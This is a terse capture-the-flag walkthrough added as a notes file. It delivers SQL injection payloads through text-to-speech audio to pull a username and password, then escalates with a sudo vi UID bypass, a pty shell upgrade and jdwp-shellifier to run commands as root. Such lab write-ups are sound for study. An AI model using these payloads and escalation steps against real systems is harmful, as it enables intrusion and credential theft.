@@ -1,0 +1,96 @@
+User
+====
+/*
+pip install gtts
+gtts-cli "mic not required" -o no.mp3
+mpg123 -w no.wav no.mp3
+*/
+
+commento = "come and sign"
+idea = schema
+won = juan
+join = 2 elai
+1)Refer to /intelligence.php to understand the commands
+2) test random word to throw eror
+gtts-cli "Open single quote. blah blah -- #" -o test.mp3
+mpg123 -w test.wav test.mp3
+
+
+Our understanding of your input is : i've been single cry it's union bull simex he's huh name 4 him is c.n.eases comments ace of base
+Query result : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 've been single cry it's union bull simex he's huh name 4 him is c.n.eases commen' at line 1
+
+3)SQL injection time
+//now try "' UNION ALL SELECT username from users-- -" #mysql query
+//now try "' UNION ALL SELECT password from users-- -" #mysql query
+//to extract username and password
+
+//try to use text2speech with male speech
+Username sql injection
+----------------------
+
+Open single quote. union. awl. select. use her name. from. users. comment database.
+'union all select username from users -- -
+
+Query result: alexa
+
+password sql injection
+----------------------
+
+Open single quote. union. awl. select. pass word. from. users. comment database. 
+' union all select password from users -- -
+
+Query result: H,Sq9t6}a<)?q93_
+
+4) ssh into alexa
+5) get the flag!!
+
+root
+====
+1) always enumerate using:
+sudo -l and /etc/passwd
+
+sudo -l
+-------
+alexa@AI:/$ sudo -l
+[sudo] password for alexa: 
+Matching Defaults entries for alexa on AI:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User alexa may run the following commands on AI:
+    (ALL, !root) /usr/bin/vi
+
+//(ALL, !root) /usr/bin/vi
+
+cat /etc/passwd
+---------------
+mrr3boot:x:4000000000:1001::/home/mrr3boot:/bin/sh
+//he have /bin/sh access
+//id: 4000000000
+
+
+//vi exploit on privilege escalation(getting shell as other user)
+2) sudo -u#4000000000 /usr/bin/vi
+//in vi ":shell"
+//gotten mrr3boot shell
+
+3)python -c 'import pty; pty.spawn("/bin/bash")'
+//used to get better shell
+
+//java exploit to execute command as root (python script)
+/*
+found that it runs java in the background and java version 
+openjdk 11.0.4 2019-07-16
+OpenJDK Runtime Environment (build 11.0.4+11-post-Ubuntu-1ubuntu218.04.3)
+OpenJDK 64-Bit Server VM (build 11.0.4+11-post-Ubuntu-1ubuntu218.04.3, mixed mode, sharing)
+*/
+python jdwp-shellifier.py -t 127.0.0.1 -p 8000 --break-on 'java.lang.String.indexOf' --cmd 'give me a shell command i ll run it as root'
+
+
+4)now try to use the java exploit(python script) to copy root.txt out
+
+i)python jdwp-shellifier.py -t 127.0.0.1 -p 8000 --break-on 'java.lang.String.indexOf' --cmd 'chmod +r /root'
+ii)python jdwp-shellifier.py -t 127.0.0.1 -p 8000 --break-on 'java.lang.String.indexOf' --cmd 'cp /root/root.txt /tmp/root.txt'
+iii)python jdwp-shellifier.py -t 127.0.0.1 -p 8000 --break-on 'java.lang.String.indexOf' --cmd 'chmod 777 /tmp/root.txt'
+iv) get the FLAG!! 
+
+
